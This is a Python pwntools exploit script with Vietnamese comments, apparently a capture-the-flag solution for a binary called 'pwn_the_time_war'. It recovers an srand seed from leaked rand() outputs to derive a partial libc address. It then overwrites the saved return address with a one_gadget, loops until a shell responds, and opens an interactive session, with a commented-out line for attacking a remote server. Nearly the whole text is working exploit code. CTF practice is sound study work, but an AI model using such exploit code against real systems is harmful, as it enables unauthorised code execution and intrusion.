#!/usr/bin/python3
from pwn import *
from ctypes import CDLL
import time

# --- CẤU HÌNH ---
exe_path = "./pwn_the_time_war_patched"
libc_path = "./libc.so.6"

context.binary = exe = ELF(exe_path, checksec=False)
libc = ELF(libc_path, checksec=False)
context.arch = "amd64"

# Tắt bớt log để đỡ rối mắt khi chạy nhiều lần
context.log_level = 'warning'

# Load Libc để giả lập rand()
try:
    libc_native = CDLL(libc_path)
except:
    log.error(f"Không tìm thấy file {libc_path}")

# --- OFFSET & CONSTANTS ---
OFFSET_CLOCK_GETTIME = 0xcf420
OFFSET_ONE_GADGET    = 0x4c139  # Nếu chạy lâu không được, hãy thử đổi gadget khác (vd: 0xe3b01, 0xe3b04)
LOW_12_BIT           = OFFSET_CLOCK_GETTIME & 0xFFF

def solve():
    attempt = 0
    # Vòng lặp chính: Chạy cho đến khi có shell
    while True:
        attempt += 1
        print(f"\r[+] Attempt: {attempt}", end="")
        p = None
        
        try:
            # 1. Khởi tạo process
            # p = remote("host", port)  # Bỏ comment dòng này khi đánh server thật
            p = process(exe.path)

            # Hàm helper để gửi dữ liệu (định nghĩa lại bên trong loop để dùng biến p)
            def sl(payload): p.sendline(payload)
            def ru(payload): return p.recvuntil(payload)
            def rln(): return p.recvline()

            def edit(idx1, val1, idx2, val2):
                ru(b'turn? ')
                sl(str(idx1).encode())
                ru(b'set it to? ')
                sl(str(val1).encode())
                ru(b'turn? ')
                sl(str(idx2).encode())
                ru(b'set it to? ')
                sl(str(val2).encode())

            # 2. Lấy 4 số random đầu tiên
            ru(b'reads: ')
            line = rln().strip().decode()
            vals = [int(x) for x in line.split("-")]

            # 3. Thực hiện Edit lần 1 (Loop back về run+1 như code cũ của bạn)
            # Mục đích: Reset vòng lặp để nhập tiếp và lấy thêm mẫu random
            edit(10, (exe.sym.run + 1) & 0xFFFF, 154, 0)

            # 4. Lấy tiếp 4 số random tiếp theo (tổng cộng 8 số để verify seed)
            ru(b'reads: ')
            line = rln().strip().decode()
            vals += [int(x) for x in line.split("-")]
            
            # 5. Brute-force Seed
            found_seed = -1
            # Range này thường đủ (0 -> 1 triệu), nếu server delay có thể cần tăng lên
            for i in range(0, 0x100000): 
                candidate_seed = (i << 12) | LOW_12_BIT
                
                libc_native.srand(candidate_seed)
                
                # Check khớp cả 8 số (4 số đầu + 4 số sau khi loop lại)
                # Lưu ý: libc_native.rand() sẽ update state nội bộ của CDLL sau mỗi lần gọi
                if (libc_native.rand() % 16 == vals[0] and
                    libc_native.rand() % 16 == vals[1] and
                    libc_native.rand() % 16 == vals[2] and
                    libc_native.rand() % 16 == vals[3] and
                    libc_native.rand() % 16 == vals[4] and
                    libc_native.rand() % 16 == vals[5] and
                    libc_native.rand() % 16 == vals[6] and
                    libc_native.rand() % 16 == vals[7]):
                    
                    found_seed = candidate_seed
                    break
            
            # Nếu không tìm thấy seed, thử lại process mới
            if found_seed == -1:
                p.close()
                continue

            # 6. Tính toán địa chỉ
            libc_base_low = found_seed - OFFSET_CLOCK_GETTIME
            target_one_gadget = libc_base_low + OFFSET_ONE_GADGET
            
            # 7. Thực hiện Edit lần 2 (Ghi One Gadget)
            # Ghi vào index 10, 11 (Saved RIP)
            edit(10, target_one_gadget & 0xFFFF, 11, (target_one_gadget >> 16) & 0xFFFF)

            # 8. Kiểm tra Shell
            # Gửi lệnh vô hại để check xem có shell không
            p.clean(timeout=0.1)
            p.sendline(b"echo PWNED; id")
            
            # Đọc phản hồi (chờ xíu để shell kịp hồi đáp)
            try:
                response = p.recv(timeout=1)
                if b"uid" in response or b"PWNED" in response:
                    print(f"\n[!] SUCCESS at attempt {attempt}!")
                    log.success(f"Seed found: {hex(found_seed)}")
                    log.success(f"One Gadget sent: {hex(target_one_gadget)}")
                    
                    # Chuyển sang mode tương tác
                    context.log_level = 'info'
                    p.interactive()
                    break # Thoát vòng lặp while lớn
            except EOFError:
                pass
            
            # Nếu đến đây mà chưa break nghĩa là thất bại
            p.close()

        except KeyboardInterrupt:
            print("\n[-] Stopping...")
            break
        except Exception as e:
            # Nếu process crash hoặc lỗi connect, đóng và thử lại
            if p: p.close()
            continue

if __name__ == "__main__":
    solve()